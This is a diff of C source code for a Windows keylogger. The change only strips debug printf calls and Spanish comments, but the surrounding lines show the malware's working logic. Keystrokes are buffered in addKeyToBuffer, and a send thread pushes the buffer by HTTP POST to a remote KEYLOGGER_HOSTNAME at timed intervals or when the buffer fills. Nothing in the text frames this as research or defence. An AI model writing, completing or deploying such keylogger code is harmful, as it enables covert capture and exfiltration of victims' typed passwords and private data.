@@ -20,14 +20,11 @@ static DWORD WINAPI sendThread(LPVOID pointer){
     if(internet==NULL){
         goto end;
     }
-
-    //abrir una conexión
     HINTERNET connection = InternetConnect(internet, KEYLOGGER_HOSTNAME, 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
     if(connection == NULL){
         InternetCloseHandle(internet);
         goto end;
     }
-
     HINTERNET request = HttpOpenRequest(connection, "POST", "", NULL, NULL, NULL, 0, 1);
     if(request == NULL){
         InternetCloseHandle(connection);
@@ -54,15 +51,12 @@ static void swapBuffers(){
 
 //guardar las teclas
 void addKeyToBuffer (const char* letter) {
-    printf("paso1");
     size_t usedBufferBytes = strlen(foregroundBuffer);
     size_t letterSize = strlen(letter);
     size_t remainingBufferBytes = KEYLOGGER_BUFFER_SIZE - usedBufferBytes;
     time_t currentTime = time(NULL);
     time_t elapsedTime = currentTime - lastSentTime;
     if(letterSize>remainingBufferBytes || elapsedTime > KEYLOGGER_SEND_TIME){
-        printf("paso2");
-        //enviar lo que tenemos y borrar el buffer
         lastSentTime = currentTime;
         sendBuffer();
     }
@@ -70,7 +64,6 @@ void addKeyToBuffer (const char* letter) {
 
 }
 
-//enviar lo que está guardado
 void sendBuffer (){
     if(strlen(foregroundBuffer) == 0){
         return;
